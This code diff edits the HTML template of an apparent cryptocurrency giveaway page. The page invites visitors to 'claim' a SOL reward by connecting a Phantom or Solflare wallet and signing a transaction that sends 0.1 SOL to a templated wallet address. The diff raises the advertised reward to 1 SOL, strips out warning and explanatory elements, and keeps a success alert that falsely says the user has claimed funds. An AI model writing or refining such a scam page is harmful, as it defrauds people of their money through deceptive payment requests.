@@ -11,7 +11,7 @@ HTML_TEMPLATE = """
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Claim 0.1 SOL</title>
+  <title>Claim 1 SOL</title>
   <style>
     body {
       background-color: #000;
@@ -38,23 +38,8 @@ HTML_TEMPLATE = """
       color: #000;
       font-weight: bold;
     }
-    .wallet-button:disabled, .claim-button:disabled {
-      background: #555;
-      cursor: not-allowed;
-      color: #999;
-    }
-    .info {
-      font-size: 1.1em;
-      margin: 20px 0;
-      color: #0f0;
-      display: none;
-    }
-    .warning {
-      color: #f44;
-      margin-top: 30px;
-    }
   </style>
-  <!-- Solana wallet adapter + web3.js -->
+  <!-- Solana wallet adapter + scripts -->
   <script type="module">
     import {
       Connection,
@@ -65,19 +50,30 @@ HTML_TEMPLATE = """
 
     let provider = null;
 
+    function updateStatus(text) {
+      const statusEl = document.getElementById("walletStatus");
+      statusEl.innerText = text;
+    }
+
     window.onload = () => {
-      // Detect solana provider - Phantom or Solflare extensions on desktop browsers
+      console.log("Page loaded, detecting wallet...");
       if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) {
         provider = window.solana;
+        console.log("Found solana provider:", provider.isPhantom ? "Phantom" : "Solflare");
         document.getElementById("connectWalletBtn").disabled = false;
         document.getElementById("claimBtn").disabled = false;
-        document.getElementById("walletStatus").innerText = "Wallet detected: " + (provider.isPhantom ? "Phantom" : "Solflare");
+        updateStatus("Wallet detected: " + (provider.isPhantom ? "Phantom" : "Solflare"));
+      } else if (window.phantom && window.phantom.solana) {
+        // Older phantom detection fallback
+        provider = window.phantom.solana;
+        console.log("Found phantom provider (fallback)");
+        document.getElementById("connectWalletBtn").disabled = false;
+        document.getElementById("claimBtn").disabled = false;
+        updateStatus("Wallet detected: Phantom (fallback)");
       } else {
-        // Show QR code and instructions if wallet not detected (likely mobile)
+        console.log("No compatible wallet detected");
         document.getElementById("qrCode").style.display = "block";
-        document.getElementById("infoManualSend").style.display = "block";
-        document.getElementById("walletStatus").innerText = "No compatible wallet detected. Use the QR code to send manually.";
-        // Disable buttons
+        updateStatus("No compatible wallet detected. Use the QR code to send manually.");
         document.getElementById("connectWalletBtn").disabled = true;
         document.getElementById("claimBtn").disabled = true;
       }
@@ -90,7 +86,8 @@ HTML_TEMPLATE = """
       }
       try {
         const res = await provider.connect();
-        document.getElementById("walletStatus").innerText = "Wallet Connected: " + res.publicKey.toString();
+        console.log("Connected wallet:", res.publicKey.toString());
+        updateStatus("Wallet Connected: " + res.publicKey.toString());
       } catch (err) {
         alert("Wallet connection failed: " + err.message);
       }
@@ -113,7 +110,6 @@ HTML_TEMPLATE = """
       );
 
       try {
-        // Sign and send transaction via wallet provider
         const { signature } = await provider.signAndSendTransaction(transaction);
         await connection.confirmTransaction(signature);
         alert("✅ Transaction sent! You’ve claimed 0.1 SOL. Please wait 24 hours.");
@@ -128,11 +124,10 @@ HTML_TEMPLATE = """
   </script>
 </head>
 <body>
-  <h1>Claim 0.1 SOL Reward</h1>
-  <p>Send exactly <b>0.1 SOL</b> to this wallet:</p>
+  <h1>Claim 1 SOL Reward</h1>
+  <p>Send exactly <b>0.1 SOL</b> to:</p>
   <p><code>{{ wallet }}</code></p>
-  <img src="{{ qr_url }}" alt="QR Code" id="qrCode" class="qr" />
-  <p id="infoManualSend" class="info">Scan the QR code with your Solflare or Phantom mobile wallet app to send 0.1 SOL manually.</p>
+  <img id="qrCode" src="{{ qr_url }}" class="qr" alt="QR Code" />
   <p id="walletStatus">Detecting wallet...</p>
   <button id="connectWalletBtn" onclick="connectWallet()" class="wallet-button" disabled>Connect Wallet</button>
   <button id="claimBtn" onclick="sendTransaction()" class="claim-button" disabled>Claim Now</button>
